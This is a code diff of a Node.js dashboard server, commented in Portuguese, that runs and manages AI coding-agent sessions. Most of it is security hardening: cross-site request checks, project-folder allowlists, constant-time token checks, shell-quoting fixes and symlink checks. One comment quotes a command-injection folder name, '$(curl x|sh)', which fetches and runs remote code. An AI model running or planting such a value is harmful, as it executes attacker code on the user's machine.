@@ -3,6 +3,7 @@
 
 import http from 'node:http'
 import fs from 'node:fs'
+import * as SEG from './seguranca.mjs' // CC-722
 import os from 'node:os'
 import path from 'node:path'
 import { execFile, spawn } from 'node:child_process'
@@ -43,11 +44,22 @@ import {
   listar as listarGate, criar as criarGate, remover as removerGate, acrescentar as acrescentarGate, guardarAnexo as guardarAnexoGate,
   deOutraMaquina as deOutraMaquinaGate,
   gravarCabecalho as gravarCabecalhoGate, reconciliar as reconciliarGate,
+  lerCabecalho as lerCabecalhoGate, ultimoDoAgente as ultimoDoAgenteGate, falasDe as falasDeGate,
 } from './gate.mjs'
 import { responder as responderGate, parar as pararGate, conversaAoVivo as conversaAoVivoGate } from './gateTurno.mjs'
 import { vivo as vivoGate, todosOsModelos as todosOsModelosGate } from './gateAgentes.mjs'
 import { arquivar, jobsHistoricos, marcosDe, mudouDesde } from './historico.mjs'
 import { readUso, lerChamada as lerChamadaStatusline } from './uso.mjs'
+
+/** O prefixo que marca uma conversa do coderoom dentro do campo `conversa`.
+ *
+ *  O painel de Sessões trata toda sessão do mesmo jeito, e o campo `conversa`
+ *  é o que liga o cartão à sessão de verdade. A sessão do Claude Code é um
+ *  terminal, e a resposta vai escrita nele (`decisao.mjs`). A do coderoom tem
+ *  caminho próprio, e a mesma mensagem escrita no terminal errado seria
+ *  mandada para lugar nenhum. O prefixo é o que separa os dois sem a tela
+ *  precisar saber, e ele nasce em `cockpit2.mjs`, que é quem monta o cartão. */
+const GATE_CONV = 'gate:'
 
 /* CC-269: carregado uma vez, usado nas duas rotas de sincronia. Fica como
    promessa e não como `await` no topo, para o arranque do painel não esperar
@@ -72,7 +84,7 @@ import { resumoDoProjeto } from './projetoResumo.mjs'
 import { marcarRespondida as marcarRespondidaHist, listar as listarHistorico } from './decisaoHistorico.mjs'
 import { trocarEstado as trocarEstadoRoadmap } from './roadmapEscrita.mjs'
 import { ultimaMexida as ultimaMexidaRoadmap, chaveDe as chaveRoadmap } from './roadmapHistorico.mjs'
-import { findProjects, projectsBase } from './install.mjs'
+import { findProjects, projectsBase, projectsBases } from './install.mjs'
 import { situacaoRotas } from './routia.mjs'
 import { retratoRotas } from './rotas.mjs'
 import { commitsDesde } from './gitlog.mjs'
@@ -153,7 +165,7 @@ import { SECOES as SECOES_VPS, veredito as veredictoVps } from './vpsSaude.mjs'
 import { estado as estadoProcessos } from './processos.mjs'
 import { estado as estadoRotinas, comparar as compararRotina, sincronizar as sincronizarRotina, remover as removerRotina } from './rotinas.mjs'
 import { garantirCambio } from './cambio.mjs'
-import { responder as responderDecisao, fechar as fecharDecisao, reabrir as reabrirDecisao, enviarMensagem as mensagemDecisao, parar as pararSessao, permitir as permitirSessao, adiar as adiarDecisao, trazer as trazerDecisao, marcarPainelAberto } from './decisao.mjs'
+import { responder as responderDecisao, fechar as fecharDecisao, reabrir as reabrirDecisao, enviarMensagem as mensagemDecisao, parar as pararSessao, permitir as permitirSessao, adiar as adiarDecisao, trazer as trazerDecisao, marcarPainelAberto, lerPedidosDoGancho } from './decisao.mjs'
 
 const HERE = path.dirname(fileURLToPath(import.meta.url))
 const UI = path.join(HERE, 'ui.html')
@@ -197,7 +209,7 @@ const RAIZ_DO_PAINEL = path.join(HERE, '..')
  * casando pelo nome da pasta, pro projeto que nunca rodou um agente.
  */
 function cwdDoProjeto(cwd, projeto) {
-  if (cwd) return cwd
+  if (cwd) return cwdPermitido(cwd) ? cwd : '' // CC-722: pasta fora dos projetos não vale
   if (!projeto) return ''
   // vivos:[] de propósito — aqui quero TODO job já visto, vivo ou não
   const doHistorico = jobsHistoricos([]).mortos.find((j) => j.project === projeto && j.cwd)?.cwd
@@ -1280,11 +1292,17 @@ const matarAgySessao = () => {
  * balde, e é o comportamento correto do programa, não defeito nosso. */
 const abrirAgySessao = (dir) => {
   matarAgySessao()
-  const alvo = dir && fs.existsSync(dir) ? dir : os.homedir()
+  // CC-722: só pasta de projeto (antes bastava existir)
+  const alvo = dir && fs.existsSync(dir) && cwdPermitido(dir) ? dir : os.homedir()
   /* O nome da pasta CRU, que é como o Antigravity nomeia o projeto ao apontar
      para ela. Nada de `nomeCanonico()` aqui: ver o aviso acima. */
   const projeto = path.basename(alvo)
-  const args = ['-qc', projeto ? `${AGY_BIN} --project ${JSON.stringify(projeto)}` : AGY_BIN, AGY_SESSAO_LOG]
+  /* CC-722, revisão de segurança: `script -qc` passa a string por um shell, e
+     JSON.stringify só punha aspas DUPLAS, dentro das quais `$(...)` e crase
+     ainda rodam. Uma pasta chamada "$(curl x|sh)" executaria. Aspas simples,
+     com a aspa simples escapada, não interpretam nada. */
+  const aspas = (s) => "'" + String(s).replace(/'/g, "'\\''") + "'"
+  const args = ['-qc', projeto ? `${AGY_BIN} --project ${aspas(projeto)}` : AGY_BIN, AGY_SESSAO_LOG]
   const filho = spawn('script', args, {
     cwd: alvo,
     detached: true,
@@ -1295,8 +1313,22 @@ const abrirAgySessao = (dir) => {
   agySessaoViva = { pid: filho.pid, dir: alvo, projeto }
 }
 
+/* CC-722, revisão de segurança (30/09): o painel roda comando na máquina de
+   propósito (/api/subir, remote-control, gate), então um pedido que ele não
+   iniciou é execução de código. O navegador diz de onde o pedido veio
+   (`Sec-Fetch-Site`): ação vinda de um SUBDOMÍNIO (testedevoo.carzo.com.br
+   manda o cookie do login, porque o SameSite=Lax não separa subdomínios) ou
+   de outro site é recusada, aqui dentro, sem depender da porta de senha.
+   Ferramenta local (os ganchos, o `cockpit done`, curl) não manda o
+   cabeçalho e segue passando. */
+// as três travas puras moram em seguranca.mjs, onde o teste as confere
+const pedidoDeFora = (req) => SEG.pedidoDeFora(req.headers)
+const tokenIgual = SEG.tokenIgual
+const cwdPermitido = (c) => SEG.cwdPermitido(c, projectsBases(), findProjects())
+
 function handler(req, res) {
   const url = new URL(req.url, 'http://localhost')
+  if (req.method !== 'GET' && req.method !== 'HEAD' && pedidoDeFora(req)) return send(res, 403, { erro: 'pedido de outro site recusado' })
 
   /* ===== CC-426, 30/08: o painel de 2.0 assume a RAIZ, a pedido dele ======
    *
@@ -1390,7 +1422,10 @@ function handler(req, res) {
     if (req.method === 'POST') {
       /* `nova`: a nota rápida da Início (26/09). Só acrescenta no topo, sem
          reenviar a lista, para não atropelar uma edição aberta na tela Notas. */
-      return comCorpo(req, res, 5e6, ({ notes, nova }) => (nova !== undefined ? acrescentarNota(nova) : { notes: writeNotes(notes) }))
+      // CC-712: `nova` pode vir como objeto { texto, titulo, projeto } ("Salvar no projeto" do Coderoom)
+      return comCorpo(req, res, 5e6, ({ notes, nova }) => (nova !== undefined
+        ? (nova && typeof nova === 'object' ? acrescentarNota(nova.texto, nova.titulo || '', nova.projeto || null) : acrescentarNota(nova))
+        : { notes: writeNotes(notes) }))
     }
     return send(res, 200, { notes: readNotes() })
   }
@@ -1734,7 +1769,7 @@ function handler(req, res) {
     const cfg = readConfig()
     const esperado = cfg.federacao?.token || ''
     if (!esperado) return send(res, 403, { error: 'federação desligada nesta máquina' })
-    if (req.headers['x-cc-token'] !== esperado) return send(res, 401, { error: 'token inválido' })
+    if (!tokenIgual(req.headers['x-cc-token'], esperado)) return send(res, 401, { error: 'token inválido' })
 
     /* `comCorpoAsync` e não `comCorpo`: montar o retrato da resposta lê disco e
        devolve promessa. Sem o `await`, a resposta sairia com uma promessa
@@ -1861,7 +1896,10 @@ function handler(req, res) {
       // copiado para a outra máquina, e quem chega aqui já passou pela senha do
       // `cockpit-auth`. O painel também só escuta em 127.0.0.1. A tela o
       // esconde atrás de um clique, para não vazar em print.
-      token: cfg.federacao?.token || '',
+      // CC-722: só para a PRÓPRIA página aberta num navegador. Um GET forjado
+      // do lado do servidor (site de cliente com falha, nesta mesma VPS) chega
+      // sem esse cabeçalho e não leva o token.
+      token: String(req.headers['sec-fetch-site'] || '') === 'same-origin' ? (cfg.federacao?.token || '') : '',
       configurada: Boolean(cfg.federacao?.token),
       enviandoPara: cfg.federacao?.enviarPara || '',
       // CC-340: pausar não apaga token nem endereço, só para de mandar.
@@ -2393,7 +2431,7 @@ function handler(req, res) {
        token que `/api/federacao` já exige. Sem o cabeçalho, é chamada local
        (a tela, pelo proxy de sempre): segue como toda outra rota segue. */
     const tokenRecebido = req.headers['x-cc-token']
-    if (tokenRecebido !== undefined && tokenRecebido !== token) {
+    if (tokenRecebido !== undefined && !tokenIgual(tokenRecebido, token)) {
       return send(res, 401, { error: 'token inválido' })
     }
 
@@ -2711,7 +2749,11 @@ function handler(req, res) {
     const id = url.searchParams.get('id')
     const c = id ? conversaAoVivoGate(id) : null
     if (!c) return send(res, 404, { erro: 'conversa não encontrada' })
-    return send(res, 200, c)
+    /* CC-723: a pergunta e a permissão em aberto desta conversa, para a
+       própria tela do Coderoom mostrar os botões, e não só Sessões. */
+    let pedidos = []
+    try { pedidos = lerPedidosDoGancho().filter((p) => p.coderoom === id) } catch { /* sem pedidos, a conversa segue */ }
+    return send(res, 200, { ...c, pedidos })
   }
 
   if (url.pathname === '/api/gate/nova' && req.method === 'POST') {
@@ -2751,12 +2793,14 @@ function handler(req, res) {
   if (url.pathname === '/api/gate/mensagem' && req.method === 'POST') {
     /* 100 KB: ele dita mensagem longa por voz, e cortar o pedido dele calado
        seria a pior forma de economizar. */
-    return comCorpo(req, res, 1e5, ({ id, texto, agente, modelo, esforco, anexos }) => {
+    return comCorpo(req, res, 1e5, ({ id, texto, agente, modelo, esforco, anexos, revisar }) => {
       if (!id || !String(texto || '').trim()) throw new Error('preciso da conversa e do texto')
       return responderGate(id, {
-        texto: String(texto), agente: agente || 'claude',
+        texto: String(texto), agente: agente || 'agy',
         modelo: modelo || null, esforco: esforco || null,
         anexos: Array.isArray(anexos) ? anexos : [],
+        /* CC-701: a revisão em dupla, só quando ele pede. */
+        revisar: revisar === true,
       })
     })
   }
@@ -2784,15 +2828,27 @@ function handler(req, res) {
   /* CC-589: a última resposta inteira de uma sessão, para "ver resposta
      completa". Só desta máquina; o id é conferido em `falaCompleta`. */
   if (url.pathname === '/api/sessao/fala') {
+    const ped = url.searchParams.get('conversa') || ''
+    /* Conversa do coderoom: o histórico é o log do gate, não um `.jsonl` do
+       Claude Code. O prefixo `gate:` é o que diz qual dos dois ler. */
+    if (ped.startsWith(GATE_CONV)) {
+      const u = ultimoDoAgenteGate(ped.slice(GATE_CONV.length))
+      return send(res, u ? 200 : 404, u ? { texto: u.texto } : { erro: 'conversa do coderoom não encontrada nesta máquina' })
+    }
     return import('./cockpit2.mjs').then((m) => {
-      const f = m.falaCompleta(url.searchParams.get('conversa'))
+      const f = m.falaCompleta(ped)
       send(res, f ? 200 : 404, f || { erro: 'conversa não encontrada nesta máquina' })
     }).catch((e) => send(res, 500, { erro: String(e.message || e) }))
   }
   /* CC-631: as últimas falas da conversa, para o modo lista da tela Sessões. */
   if (url.pathname === '/api/sessao/conversa') {
+    const ped = url.searchParams.get('conversa') || ''
+    if (ped.startsWith(GATE_CONV)) {
+      const f = falasDeGate(ped.slice(GATE_CONV.length))
+      return send(res, f ? 200 : 404, f ? { falas: f } : { erro: 'conversa do coderoom não encontrada nesta máquina' })
+    }
     return import('./cockpit2.mjs').then((m) => {
-      const r = m.conversaRecente(url.searchParams.get('conversa'))
+      const r = m.conversaRecente(ped)
       send(res, r ? 200 : 404, r || { erro: 'conversa não encontrada nesta máquina' })
     }).catch((e) => send(res, 500, { erro: String(e.message || e) }))
   }
@@ -2896,6 +2952,7 @@ function handler(req, res) {
         if (b.acao === 'arquivo-subir') return A.subirArquivo(b)
         if (b.acao === 'arquivo-apagar') return A.apagarArquivo(b.id)
         if (b.acao === 'arquivo-mover') return A.moverArquivo(b.id, b.gaveta)
+        if (b.acao === 'arquivo-projeto') return A.projetoDoArquivo(b.id, b.projeto) // CC-709
         return { ok: false, erro: 'ação desconhecida' }
       })
     }).catch((e) => send(res, 500, { error: String(e.message || e) }))
@@ -2907,6 +2964,19 @@ function handler(req, res) {
       if (!a) return send(res, 404, { error: 'arquivo não existe' })
       res.writeHead(200, { 'content-type': a.mime, 'content-length': a.bytes, 'content-disposition': `inline; filename="${encodeURIComponent(a.nome)}"`, 'content-security-policy': "default-src 'none'; style-src 'unsafe-inline'", 'cache-control': 'private, max-age=3600' })
       fs.createReadStream(a.caminho).pipe(res)
+    }).catch((e) => send(res, 500, { error: String(e.message || e) }))
+    return
+  }
+  /* CC-712, o contexto do Coderoom: arquivos do projeto (os principais e a
+     lista do "@") e os comandos e skills (a lista do "/"). Só leitura, e só
+     projeto que a máquina conhece. */
+  if (url.pathname === '/api/coderoom/arquivos' || url.pathname === '/api/coderoom/comandos') {
+    import('./coderoomCtx.mjs').then(async (C) => {
+      const raiz = url.searchParams.get('raiz') || ''
+      if (raiz && !findProjects().includes(raiz)) return send(res, 404, { error: 'projeto desconhecido' })
+      if (url.pathname.endsWith('/comandos')) return send(res, 200, { comandos: C.comandosDe(raiz || null) })
+      if (!raiz) return send(res, 400, { error: 'falta o projeto' })
+      return send(res, 200, await C.arquivosDe(raiz))
     }).catch((e) => send(res, 500, { error: String(e.message || e) }))
     return
   }
@@ -2947,10 +3017,27 @@ function handler(req, res) {
     return
   }
   if (url.pathname === '/api/decisao/parar' && req.method === 'POST') {
-    return comCorpoAsync(req, res, 1e3, ({ conversa }) => pararSessao({ conversa }))
+    return comCorpoAsync(req, res, 1e3, ({ conversa }) => {
+      /* O botão "parar" do cartão é o mesmo nas duas famílias, e o prefixo é o
+         que diz para quem ele manda o Esc. */
+      if (String(conversa || '').startsWith(GATE_CONV)) return pararGate(conversa.slice(GATE_CONV.length))
+      return pararSessao({ conversa })
+    })
   }
   if (url.pathname === '/api/decisao/mensagem' && req.method === 'POST') {
     return comCorpoAsync(req, res, 2e4, async ({ conversa, texto }) => {
+      /* Responder pelo cartão de uma sessão do coderoom, pedido dele: o campo
+         de mensagem aparece igual ao do Claude Code.
+         O AGENTE e o MODELO não vêm da tela de propósito: a conversa já guarda
+         a escolha dele, e mandar o padrão aqui trocaria o agente no meio da
+         conversa (o que ele pediu para não acontecer em 28/09). Sem os dois, o
+         gate usa o que está gravado. */
+      if (String(conversa || '').startsWith(GATE_CONV)) {
+        const id = String(conversa).slice(GATE_CONV.length)
+        const cab = lerCabecalhoGate(id)
+        if (!cab) return { ok: false, erro: 'essa conversa do coderoom não existe mais' }
+        return responderGate(id, { texto: String(texto || ''), agente: cab.estado?.agente || cab.agentePadrao || 'agy' })
+      }
       const r = await mensagemDecisao({ conversa, texto })
       if (r && r.ok) marcarRespondidaHist(String(conversa || '').slice(0, 8))
       return r
@@ -2961,6 +3048,59 @@ function handler(req, res) {
     return comCorpo(req, res, 1e3, ({ id }) => pararGate(id))
   }
 
+  /* CC-699: troca a permissão da conversa. Só dois valores, de propósito: o
+     texto vira argumento do agente, e valor livre aqui seria ele escolhendo
+     `bypassPermissions` por um campo de formulário. */
+  if (url.pathname === '/api/gate/permissao' && req.method === 'POST') {
+    return comCorpo(req, res, 1e3, ({ id, permissao }) => {
+      if (!id) throw new Error('preciso saber qual conversa')
+      if (!['acceptEdits', 'pergunteAntes'].includes(permissao)) throw new Error('permissão desconhecida')
+      /* Conferir ANTES: gravar num id que não existe criaria uma conversa fantasma. */
+      if (!conversaAoVivoGate(String(id))) throw new Error('conversa não encontrada')
+      gravarCabecalhoGate(String(id), { permissao })
+      return { ok: true, permissao }
+    })
+  }
+
+  /* CC-728: agente e modelo que respondem nesta conversa, trocados de fora do
+     Coderoom (pelo cartão em Sessões). Modelo vazio volta ao padrão do agente. */
+  if (url.pathname === '/api/gate/agente' && req.method === 'POST') {
+    return comCorpo(req, res, 1e3, ({ id, agente, modelo }) => {
+      if (!id) throw new Error('preciso saber qual conversa')
+      if (!['claude', 'opencode', 'agy'].includes(agente)) throw new Error('agente desconhecido')
+      const cab = lerCabecalhoGate(String(id))
+      if (!cab) throw new Error('conversa não encontrada')
+      const modelos = { ...(cab.modelos || {}) }
+      if (modelo) modelos[agente] = String(modelo).slice(0, 120); else delete modelos[agente]
+      gravarCabecalhoGate(String(id), { agentePadrao: agente, modelos })
+      return { ok: true, agente, modelo: modelo || null }
+    })
+  }
+
+  /* CC-727: renomear a conversa. `tituloDele` impede o nome automático de
+     passar por cima do nome que ele deu. */
+  if (url.pathname === '/api/gate/renomear' && req.method === 'POST') {
+    return comCorpo(req, res, 1e3, ({ id, titulo }) => {
+      const t = String(titulo || '').replace(/\s+/g, ' ').trim().slice(0, 80)
+      if (!id || !t) throw new Error('preciso da conversa e do nome')
+      if (!lerCabecalhoGate(String(id))) throw new Error('conversa não encontrada')
+      gravarCabecalhoGate(String(id), { titulo: t, tituloDele: true })
+      return { ok: true, titulo: t }
+    })
+  }
+
+  /* CC-716: modo do opencode na conversa, "flash" (rápido, sem memória) ou
+     "normal" (com memória). Nomes dele. */
+  if (url.pathname === '/api/gate/opencode-modo' && req.method === 'POST') {
+    return comCorpo(req, res, 1e3, ({ id, modo }) => {
+      if (!id) throw new Error('preciso saber qual conversa')
+      if (!['flash', 'normal', 'avulso'].includes(modo)) throw new Error('modo desconhecido')
+      if (!conversaAoVivoGate(String(id))) throw new Error('conversa não encontrada')
+      gravarCabecalhoGate(String(id), { opencodeModo: modo })
+      return { ok: true, modo }
+    })
+  }
+
   /* Apaga uma conversa. Devolve `achou: false` quando não havia nada, em vez de
      dizer que apagou: "apaguei" sem ter apagado é a mentira mais fácil de
      contar aqui, porque some justamente o que se usaria para conferir. */
@@ -2969,6 +3109,13 @@ function handler(req, res) {
       if (!id) throw new Error('preciso saber qual conversa')
       pararGate(id)
       return removerGate(id)
+    })
+  }
+
+  if (url.pathname === '/api/gate/arquivar' && req.method === 'POST') {
+    return comCorpo(req, res, 1e3, ({ id, arquivar }) => {
+      if (!id) throw new Error('preciso saber qual conversa')
+      return gravarCabecalhoGate(id, { arquivada: !!arquivar })
     })
   }
 
@@ -2994,6 +3141,12 @@ function handler(req, res) {
     if (!/[/\\][a-z0-9-]+\.anexos[/\\]/i.test(caminho) || !fs.existsSync(caminho)) {
       return send(res, 404, { erro: 'anexo não encontrado' })
     }
+    /* CC-722, revisão de segurança: um atalho (symlink) dentro de uma pasta de
+       anexos apontando para ~/.ssh passava. O caminho REAL também tem que
+       estar numa pasta de anexos. */
+    let real = ''
+    try { real = fs.realpathSync(caminho) } catch { /* some abaixo */ }
+    if (!/[/\\][a-z0-9-]+\.anexos[/\\]/i.test(real)) return send(res, 404, { erro: 'anexo não encontrado' })
     const tipos = { '.png': 'image/png', '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.webp': 'image/webp', '.gif': 'image/gif' }
     const tipo = tipos[path.extname(caminho).toLowerCase()] || 'application/octet-stream'
     res.writeHead(200, { 'content-type': tipo, 'cache-control': 'private, max-age=3600' })
@@ -4166,6 +4319,8 @@ function handler(req, res) {
  * é o mínimo para o upgrade completar. Só 127.0.0.1 e só as portas declaradas.
  */
 function proxyUpgrade(req, socket, head) {
+  // CC-722: WebSocket aberto a partir de subdomínio ou outro site é recusado, como as ações
+  if (pedidoDeFora(req)) { socket.destroy(); return }
   const caminho = (req.url || '').split('?')[0]
   const busca = req.url.includes('?') ? `?${req.url.split('?')[1]}` : ''
 
